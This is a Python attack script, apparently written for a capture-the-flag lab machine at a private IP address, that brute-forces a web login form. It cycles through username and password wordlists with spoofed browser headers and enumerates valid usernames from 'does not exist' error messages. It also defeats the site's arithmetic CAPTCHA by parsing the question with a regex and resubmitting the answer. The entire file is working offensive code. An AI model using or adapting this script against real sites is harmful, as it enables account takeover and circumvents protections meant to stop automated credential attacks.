import re
import requests

usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
url = "http://10.10.64.169/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.64.169",
    "Connection": "close",
    "Referer": "http://10.10.64.169/login",
    "Upgrade-Insecure-Requests": "1",
}


def calculate(num1, num2, operation):
    if operation == '*':
        return num1 * num2
    elif operation == '+':
        return num1 + num2
    elif operation == '-':
        return num1 - num2
    elif operation == '/':
        return num1 / num2
    else:
        raise ValueError(f"Invalid operation: {operation}")


def user_does_not_exist(response_text):
    return "does not exist" in response_text.lower()


with open(usernames_file, "r") as uf, open(passwords_file, "r") as pf:
    usernames = uf.read().splitlines()
    passwords = pf.read().splitlines()

for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password,
        }
        response = requests.post(url, headers=headers, data=data)
        response_size = len(response.content)

        if user_does_not_exist(response.text):
            print(f"Skipping username {username} as it does not exist.")
            break

        if "does not exist" not in response.text.lower() and "captcha" not in response.text.lower():
            # Replace this with a specific success condition for the website
            print(f"Success, {username}, {password}, {response_size}")
            exit(0)
        else:
            print(f"Failed, {username}, {password}, {response_size}")

        if "captcha" in response.text.lower():
            captcha_question = re.search(r"(\d+)\s*([\+\-\*/])\s*(\d+)", response.text)
            if captcha_question:
                num1 = int(captcha_question.group(1))
                operation = captcha_question.group(2)
                num2 = int(captcha_question.group(3))
                captcha = calculate(num1, num2, operation)
                data["captcha"] = captcha

                # Resubmit the previous username, password, and captcha answer
                response = requests.post(url, headers=headers, data=data)
                response_size = len(response.content)

                if user_does_not_exist(response.text):
                    print(f"Skipping username {username} as it does not exist.")
                    break

                if "does not exist" not in response.text.lower() and "captcha" not in response.text.lower():
                    # Replace this with a specific success condition for the website
                    print(f"Success, {username}, {password}, {response_size}")
                    exit(0)
                else:
                    print(f"Failed, {username}, {password}, {response_size}")

print("Failed to log in with the given credentials.")

